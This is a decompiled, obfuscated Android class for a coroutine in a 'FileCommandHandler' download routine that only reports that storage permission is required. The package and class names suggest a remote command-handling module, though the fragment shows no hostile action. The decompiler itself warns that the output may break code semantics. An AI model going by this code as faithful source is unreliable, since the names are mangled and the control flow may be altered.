package com.storm.safe.rock.service.modules.command;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.C1496yx;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.FileCommandHandler$handleFileDownloadHttp$2", m214403f = "FileCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class FileCommandHandler$handleFileDownloadHttp$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C1496yx f53472a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53473a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f53474a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public FileCommandHandler$handleFileDownloadHttp$2(C1496yx c1496yx, String str, String str2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53472a1 = c1496yx;
        this.f53473a2 = str;
        this.f53474a3 = str2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new FileCommandHandler$handleFileDownloadHttp$2(this.f53472a1, this.f53473a2, this.f53474a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((FileCommandHandler$handleFileDownloadHttp$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        if (this.f53472a1 == null) {
            return null;
        }
        C1496yx.m215317b2(this.f53473a2, this.f53474a3, "需要存储权限");
        return C1351vv.f60710b1;
    }
}
